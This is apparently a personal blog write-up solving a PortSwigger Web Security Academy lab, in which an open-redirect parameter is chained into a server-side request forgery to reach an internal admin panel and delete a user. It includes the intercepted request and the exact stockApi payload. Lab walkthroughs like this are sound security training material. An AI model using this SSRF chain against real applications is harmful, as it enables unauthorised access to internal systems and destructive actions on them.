---
title: "SSRF: challange 5"
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/ssrf.png"
---

# SSRF with filter bypass via open redirection
---

Link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

### solution

- start the lab and remember the objective is to open `/admin` and delete the user carlos
- if u try going to `/admin` endpoint, you will n't get the result as u can't access it directly.
- so let's go to products and click check stock as challange describtion said
- intercept this request

```
POST /product/stock HTTP/2
Host: 0aba00cf04fc37d787d2ecab009800c8.web-security-academy.net
Cookie: session=Jkj8BtT8GyJXGIIkD92AI4jVwg1i5kVt; session=xePg3AZmakzW3clhYyuezrf201WpqbH6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aba00cf04fc37d787d2ecab009800c8.web-security-academy.net/product?productId=5
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0aba00cf04fc37d787d2ecab009800c8.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D5%26storeId%3D1
```

- we see that in the stockAPI parameter, we can't make the server issue the request directly to a different host.
- but when we intercept `next product` request we find that there's a path parameter
- so we can make use of it in stockAPI parameter ny making it = `/product/nextProduct?path=http://192.168.0.12:8080/admin`
- It redirects us to admin interface, so let's delete carlos by making stockAPI=`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- congratzzzzzzzzzzzz